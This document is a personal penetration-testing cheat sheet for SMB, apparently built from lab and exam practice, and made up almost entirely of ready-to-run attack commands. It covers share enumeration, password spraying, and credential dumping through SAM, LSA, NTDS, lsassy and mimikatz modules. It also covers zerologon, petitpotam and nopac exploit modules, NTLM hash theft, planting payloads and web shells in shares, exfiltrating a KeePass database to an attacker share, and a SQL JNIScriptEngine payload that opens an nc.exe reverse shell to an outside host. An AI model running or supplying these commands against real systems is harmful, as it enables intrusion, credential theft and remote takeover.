## SMB Checklist

```bash
enum4linux -a $ip
enum4linux -a -u "$dom\\$user" -p "$pass" $ip
enum4linux -a -M -l -d $ip 2>&1
enum4linux -a -u "" -p "" $ip && enum4linux -a -u "guest" -p "" $ip
enum4linux-ng $ip
nmap $ip -p 139,445 –script smb*
smbclient -L //$ip
smbclient -N -L //$ip
smbclient -L //$ip -N
smbclient -N //$ip/backup
smbclient -L //$ip/myshare -U anonymous
smbclient //$ip/transfer -N
smbclient -U '%' -N \\\\$ip\\share
smbclient -U 'guest' \\\\$ip\\share
smbclient -U null -N \\\\$ip\\share
smbclient -U '%' -N \\\\$ip\\share -m SMB2
smbclient -U '%' -N \\\\$ip\\share -m SMB3
smbclient -L \\$ip -U "" -N -p 12445
smbclient '//$ip/Sarge' -p 12445
proxychains -q smbclient //172.16.173.21/monitoring -U "relia.com\andrea"
smbclient.py -k @braavos.essos.local # -no-pass
smbclient —kerberos //$dc/share


cd /opt/ntlm_theft # If writable shares
python ntlm_theft.py -g all -s $myip -f site
sudo responder -I tun0 -d -w
for file in $(ls .); do smbclient -U $user%$pass //$ip/Shared -c "put $file"; done # put all files in local directory in share root
for d in $(cat dirs.txt); do smbclient -U $user%$pass //$ip/homes -c "prompt OFF; recurse ON; cd /$d; lcd /home/kali/practice/hok/theft; mput *" ; wait ; done
for d in $(cat dirs.txt); do smbclient -U $user%$pass //$ip/homes -c "prompt OFF; recurse ON; cd /$d; lcd /home/kali/practice/hok/theft; put shell139.exe"; wait ; done
smbclient.py $dom
smbclient -W WORKGROUP -U % -t 5 -L //$dom -g
smbclient -W WORKGROUP -U % -s /tmp/tmpm24idfat -t 5 -L //192.168.154.117 -g
smbclient.py active.htb/SVC_TGS:GPPstillStandingStrong2k18@$ip
> shares
> use Users

nxc smb $ip -u 'a' -p '' --shares # Guest logon
nxc smb $ip  -u 'user' -p 'pass' -M spider_plus
nxc SMB $ip -u USER -p PASSWORD --spider C\$ --pattern txt
nxc smb $ip -u $user -p $pass -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=1000000000

rpcclient -N -U "" \\$ip
rpcclient -U “” $ip ///when asked enter empty password
rpcclient -U “” $ip -N
rpcclient $>srvinfo
rpcclient $>enumdomusers
rpcclient $>querydominfo
rpcclient $>getdompwinfo   //password policy
rpcclient $>netshareenum
nmblookup -A 192.168.1.1
nbtscan IP

smbmap -H $ip
smbmap -H $ip -u 'a' -p ''
smbmap -H $ip -u '' -p '' -d $dom
smbmap -H $ip -u '' -p '' -r 'IPC$'

smbclient —kerberos //$dc/share
```

#### Look up the SMB versions

Miss this everytime.

#### NXC

```bash
nxc smb $ip
nxc smb $ip -u $user -p $pass --shares
nxc smb $ip -u $user -p $pass -M spider_plus
nxc smb $ip -u $user -p $pass -M spider_plus -o READ_ONLY=False
nxc $ip -u $user -p $pass --sessions
nxc smb $ip -u $user -p $pass --disks
nxc smb $dc -u $user -p $pass --pass-pol
nxc smb $ip -u $user -p $pass
nxc smb $ip -u $user -H $hash
nxc smb $ip -u '' -p ''
nxc smb $ip -u $user user2 user3 -p Summer18
nxc smb $ip -u $user -p $pass1 $pass2 $pass3
nxc smb $ip -u /path/to/users.txt -p Summer18
nxc smb $ip -u $user -p /path/to/$passs.txt
nxc smb $ip -u users.txt -p Summer18 --continue-on-success
nxc smb $ip -u $user -p $pass --local-auth
nxc smb $ip -u $user -p $pass --sam
nxc smb $ip -u $user -p $pass --lsa
nxc smb $dc -u $user -p $pass --ntds #Via RPC
nxc smb $dc -u $user -p $pass --ntds vss #Via VSS
nxc smb $ip -u $user -p $pass -M lsassy
nxc smb $ip -u $user -p $pass -M nanodump
nxc smb $ip -u $user -p $pass -M mimikatz
nxc smb $ip -u $user -p $pass -M procdump
nxc ldap $dc -u $ip -p $pass -M laps -o computer=$ip
nxc $ip -u Administrator -p $pass -x whoami
nxc $ip -u Administrator -p $pass -X '$PSVersionTable'
nxc smb $ip -u $user -p $pass -M slinky -o SERVER=$myip -o NAME=nxc.kerberload
nxc smb $ip -u $user -p $pass -M scuffy -o SERVER=$myip -o NAME=nxc.kerberload
nxc smb $dc -u '' -p '' -M zerologon
nxc smb $dc -u '' -p '' -M petitpotam
nxc smb $dc -u $user -p $pass -M nopac
```
#### To recursively download

```bash
> prompt off
> recurse on
> mget *

> prompt off
> recurse on
> dir *

// smbmap
// crackmapexec
```

You can try putting payloads in SMBs as soon as you can, that way you don't have to worry about that method of client-side attacks.

If you can navigate to the web root, maybe wwwroot, you can upload a shell and try to access it through your browser.

#### Mounting SMB Shares

Instead of enumerating Windows shares with smbclient, you can mount shares on your local filesystem and enumerate in a familiar environment.
```bash
sudo mkdir /mnt/data
sudo mount -t cifs //123.123.123.123/Data /mnt/data
sudo mount -t cifs -o sec=krb5,vers=3.0 '//SERVER.DOMAIN.LOCAL/SHARE' /mnt/share
```

Note that Windows likes to store some files in UTF-16LE, while Linux likes UTF8. If you run into this problem, you'll need to convert in order to cat the files.

```bash
cat file | iconv -f UTF-16LE -t utf8
```

#### Notes

Using nxc smb will find you the domain name quickly.

Resource: https://www.netexec.wiki/smb-protocol/enumeration/enumerate-null-sessions

#### Create Samba (SMB) Share on Kali

To start an SMB share on a Kali Linux machine, you typically use Samba, a popular open-source        
software suite that provides file and print services to SMB/CIFS clients. Here's a quick guide:      

1. Install Samba:

```bash   
sudo apt update
sudo apt install samba
```

2. Configure Samba:

Edit the Samba configuration file:

```bash
sudo nano /etc/samba/smb.conf
```

Add your share definition at the end of the file. For example:        

```bash
[MyShare]
path = /path/to/your/share
available = yes
valid users = your_username
read only = no
browsable = yes              
public = yes
writable = yes
```

3. Add a Samba User:

Samba requires a Linux user to map to. If you haven't already, create a Linux user or use an existing one.
Then, add the user to Samba:

```bash
sudo smbpasswd -a your_username
sudo systemctl restart smbd smbd
```

4.  Verify the Share:

From a Windows machine, you can access the share using "\\kali_ip\MyShare".
From a Linux machine, use smbclient to access the share.

```bash
    "//kali_ip/MyShare -U your_username" 
```
Alternative:

Kali:

```bash
impacket-smbserver -smb2support newShare . -username test -password test
```

Windows:

```bash
PS C:\Users\jim\Documents> net use z: \\192.168.45.163\newShare /u:test test
PS C:\Users\jim\Documents> copy Database.kdbx z:\
```

You can also execute commands that lie on your Linux machine from a Windows one through SMB shares:

```bash
sudo smbserver.py -smb2support Share .

CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c //192.168.45.163/Share/nc.exe -e cmd.exe 192.168.45.163 8082").getInputStream()).useDelimiter("\\Z").next()');
#or 
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c //192.168.45.163/Share/wicked.exe").getInputStream()).useDelimiter("\\Z").next()');
```